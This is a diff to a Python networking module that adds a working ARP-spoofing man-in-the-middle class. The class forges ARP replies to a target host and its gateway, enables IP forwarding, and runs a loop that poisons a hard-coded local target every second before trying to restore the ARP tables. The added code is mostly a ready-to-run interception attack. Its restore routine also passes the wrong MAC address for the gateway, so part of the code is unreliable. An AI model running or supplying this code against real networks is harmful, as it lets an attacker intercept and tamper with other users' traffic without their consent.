@@ -1,6 +1,7 @@
-import os, socket, secrets, hashlib, json, colorama
+import os, socket, secrets, hashlib, json, colorama, time, logging
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from scapy.layers.l2 import ARP, Ether, srp
+from scapy.all import send, get_if_hwaddr
 
 class generall:
     def clear() -> None:
@@ -152,11 +153,18 @@ class net:
             return aesgcm.decrypt(nonce, cipher, None)
     
     class MITM:
-        def __init__(self, target_ip:str, gateway_ip:str):
+        def __init__(self, target_ip:str, gateway_ip:str, my_ip:str, interface:str):
+            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
             self.target_ip = target_ip
             self.gateway_ip = gateway_ip
+            self.ip = my_ip
+            self.mac = get_if_hwaddr(interface)
+            self.interface = interface
+
+            self.target_mac = self.get_mac(self.target_ip)
+            self.gateway_mac = self.get_mac(self.gateway_ip)
         
-        def get_mac(ip:str) -> str:
+        def get_mac(self, ip:str) -> str:
             """           
             :param ip: The IP of the Device, you want the mac of
             :type ip: str
@@ -173,9 +181,110 @@ class net:
                 raise ConnectionError("can't get MAC address!")
             
             return answered[0][1].hwsrc
+        
+        def spoof(self, target_or_gateway:str) -> None:
+            """
+            :param target_or_gateway: if target -> "target" | elif gateway -> "gateway"
+            :type target_or_gateway: str
+            """
+            if target_or_gateway == "target":
+                target_ip = self.target_ip
+                target_mac = self.target_mac
+                spoof_ip = self.gateway_ip
+            elif target_or_gateway == "gateway":
+                target_ip = self.gateway_ip
+                target_mac = self.gateway_mac
+                spoof_ip = self.target_ip
+            else:
+                raise SystemError("No matching type found! (something else than target / gateway)")
+            
+            eth = Ether(
+                src=self.mac,
+                dst=target_mac
+            )
+
+            arp = ARP(
+                op=2,
+                pdst=target_ip,
+                psrc=spoof_ip,
+                hwdst=target_mac,
+                hwsrc=self.mac
+            )
+            packet = eth / arp
+            send(packet, iface=self.interface, verbose=0)
+        
+        def restore(self, target_or_gateway:str) -> None:
+            """
+            :param target_or_gateway: if target -> "target" | elif gateway -> "gateway"
+            :type target_or_gateway: str
+            """
+            if target_or_gateway == "target":
+                target_ip = self.target_ip
+                target_mac = self.target_mac
+                original_ip = self.gateway_ip
+                original_mac = self.gateway_mac
+            elif target_or_gateway == "gateway":
+                target_ip = self.gateway_ip
+                target_mac = self.gateway_mac
+                original_ip = self.target_ip
+                original_mac = self.gateway_mac
+            else:
+                raise SystemError("No matching Type found! (something else than target / gateway)")
+            
+            eth = Ether(
+                src=self.mac,
+                dst=target_mac
+            )
+
+            arp = ARP(
+                op=2,
+                pdst=target_ip,
+                psrc=original_ip,
+                hwdst=target_mac,
+                hwsrc=original_mac
+            )
+            packet = eth / arp
+            send(packet, iface=self.interface, verbose=0)
+        
+        def change_ip_forwarding(self, active:bool) -> None:
+            """
+            :param active: if you want it to be active
+            :type active: bool
+            """
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                if active:
+                    f.write("1")
+                else:
+                    f.write("0")
     
 if __name__ == "__main__":
     generall.clear()
     print(generall.display_header("test in func.py"))
-    mac = net.MITM.get_mac("192.168.178.57")
-    print(mac)
+
+    MITM = net.MITM("192.168.178.57", "192.168.178.1", "192.168.178.31", "eno1")
+    print(f"my mac: {MITM.mac}")
+    print(f"gateway_ip: {MITM.gateway_ip}")
+    print(f"gateway_mac: {MITM.gateway_mac}")
+    print(f"target_ip: {MITM.target_ip}")
+    print(f"target_mac: {MITM.target_mac}")
+
+    print("[*] start spoofing (Ctrl+C to stop)")
+    MITM.change_ip_forwarding(True)
+    try:
+        while True:
+                print("...doing it's stuff...")
+                MITM.spoof("target")
+                MITM.spoof("gateway")
+                time.sleep(1)
+    except KeyboardInterrupt:
+        print("[*] now clearing...")
+    except Exception as e:
+        print("Exception: ", e)
+    finally:
+        print("[*] now in finally doing it's clearing")
+        for _ in range(14):
+            print(f"Step {_+1}/14")
+            MITM.restore("target")
+            MITM.restore("gateway")
+            time.sleep(0.4)
+        MITM.change_ip_forwarding(False)
